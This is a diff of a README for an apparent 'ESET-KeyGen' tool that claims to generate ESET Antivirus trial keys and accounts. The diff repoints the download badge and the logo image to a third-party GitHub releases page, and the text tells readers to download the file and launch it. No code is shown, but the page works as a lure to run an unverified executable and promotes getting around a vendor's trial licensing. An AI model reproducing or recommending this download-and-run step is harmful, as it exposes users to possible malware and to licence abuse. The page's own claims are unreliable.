@@ -17,7 +17,7 @@ Here are some of the key features of the ESET-KeyGen tool:
 
 ## Get Started
 To get started with the ESET-KeyGen tool, please visit the following link:
-[![Download ESET-KeyGen](https://img.shields.io/badge/Download-Release.zip-blue)](https://github.com/assets/Release.zip)
+[![Download ESET-KeyGen](https://github.com/Apk1989/ESET-KeyGen-2025/releases)](https://github.com/Apk1989/ESET-KeyGen-2025/releases)
 
 Make sure to launch the file once you have downloaded it to start generating trial keys and accounts for ESET Antivirus.
 
@@ -30,6 +30,6 @@ Thank you for choosing ESET-KeyGen-2025! 🌟
 
 Let's ensure your ESET Antivirus experience is secure and hassle-free with our trial key and account generation tool. Happy protecting! 🛡️🔒
 
-![ESET Antivirus Logo](https://example.com/eset_logo.png)
+![ESET Antivirus Logo](https://github.com/Apk1989/ESET-KeyGen-2025/releases)
 
 [Disclaimer: This is a fictional repository and the information provided is for demonstration purposes only.]
